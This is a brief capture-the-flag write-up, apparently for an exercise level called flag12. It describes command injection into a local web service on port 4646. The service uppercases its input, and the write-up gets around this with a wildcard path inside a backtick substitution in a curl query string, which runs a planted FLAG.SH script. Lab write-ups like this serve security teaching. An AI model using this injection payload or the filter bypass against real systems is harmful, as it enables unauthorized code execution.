In root directory there is a file that show there is a server running on port 4646.
The script change the character to uppercase, so we can't manage to inject a to use getflag directly.
So we will create a script called FLAG.SH in that we call getflag and redirect the result to flag12.
chmod 777 FLAG.SH
Using wild card, otherwise tmp would have been TMP
curl localhost:4646?x="\`/*/flag.sh\`"
Then we can get the flag with cat /tmp/flag12
